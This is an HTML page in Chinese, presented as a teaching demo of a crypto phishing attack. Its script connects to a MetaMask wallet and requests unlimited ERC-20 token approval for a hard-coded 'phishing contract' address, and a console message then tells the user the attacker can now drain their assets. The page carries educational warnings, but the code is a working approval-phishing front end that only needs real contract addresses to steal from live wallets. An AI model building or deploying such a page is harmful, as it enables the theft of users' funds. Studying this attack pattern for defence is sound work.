<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>惡意合約教學示範 (DEMO ONLY)</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol';
            background-color: #f0f4f7;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            padding: 2rem;
            background-color: #fff;
            border-radius: 12px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            margin-top: 4rem;
            text-align: center;
        }
        .warning-box {
            background-color: #f2dede;
            color: #a94442;
            border: 1px solid #ebccd1;
            padding: 1rem;
            margin-bottom: 1rem;
            border-radius: 8px;
            font-weight: bold;
        }
        .button {
            padding: 0.75rem 1.5rem;
            font-size: 1rem;
            font-weight: 600;
            color: #fff;
            background-color: #d9534f;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 0.5rem;
        }
        .button:hover {
            background-color: #c9302c;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>⚠️ 惡意合約教學示範 ⚠️</h1>
    <div class="warning-box">
        此頁面僅供學習和研究目的。<br>
        點擊下方按鈕將**模擬一個釣魚攻擊**。<br>
        請勿在真實錢包或與任何實際資產連接的網路中使用。
    </div>
    
    <div style="margin-top: 2rem;">
        <p>點擊下方按鈕以開始釣魚攻擊模擬。</p>
        <button id="phishingButton" class="button">啟動釣魚攻擊 (DEMO)</button>
    </div>
    
    <div style="margin-top: 2rem;">
        <p>請打開你的瀏覽器控制台 (Console) 來查看詳細步驟。</p>
    </div>
</div>

<script src="https://unpkg.com/ethers@6/dist/ethers.umd.min.js"></script>

<script>
    // 假設你已經部署了惡意合約和 mUSDT 代幣
    // 請將以下地址替換成你實際部署的合約地址

    // 惡意合約（Phishing Contract）地址
    const PHISHING_CONTRACT_ADDRESS = "0x5f1caa852a7232336406daf6b13b7f0ee56ace42"; 
    // 你部署的 mUSDT 代幣合約地址
    const MUSDT_CONTRACT_ADDRESS = "0xbd7ba6764f2b0a5cf4e3e1f74a0e925e4dd05e4b"; 


    // mUSDT 代幣的 ABI，只需要包含 approve 函數
    const musdtABI = [
        {
            "inputs": [
                { "internalType": "address", "name": "spender", "type": "address" },
                { "internalType": "uint256", "name": "amount", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [
                { "internalType": "bool", "name": "", "type": "bool" }
            ],
            "stateMutability": "nonpayable",
            "type": "function"
        }
    ];

async function setupWeb3() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            // 步驟一：先請求授權來存取使用者的帳戶。
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // 步驟二：一旦授權被允許，現在才創建提供者。
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();

            return { provider, signer };
        } catch (error) {
            console.error("Failed to connect to wallet:", error);
            alert("連接錢包失敗。請檢查 MetaMask 或瀏覽器設定。");
            return null;
        }
    } else {
        alert("請安裝 MetaMask 錢包！");
        return null;
    }
}

// 這個函數模擬了釣魚網站的行為
async function executePhishingAttack() {
    const web3 = await setupWeb3();
    if (!web3) return;

    try {
        const { signer } = web3;

        // 步驟一：請求無限授權
        const musdtContract = new ethers.Contract(MUSDT_CONTRACT_ADDRESS, musdtABI, signer);
        const amountToApprove = ethers.MaxUint256; 

        console.log("正在請求授權...請在錢包中確認！");
        const approveTx = await musdtContract.approve(PHISHING_CONTRACT_ADDRESS, amountToApprove);
        
        console.log("已發送授權交易，等待確認...");
        await approveTx.wait();
        console.log("授權成功！");
        
        // 模擬攻擊者後台操作
        console.log("授權成功！攻擊者現在可以在後台轉走你的資產。");

    } catch (error) {
        console.error("發生錯誤:", error);
        alert("釣魚操作失敗。請檢查控制台。");
    }
}

    // 綁定到頁面上的按鈕
    document.getElementById('phishingButton').addEventListener('click', executePhishingAttack);
</script>

</body>
</html>fcbsfbs
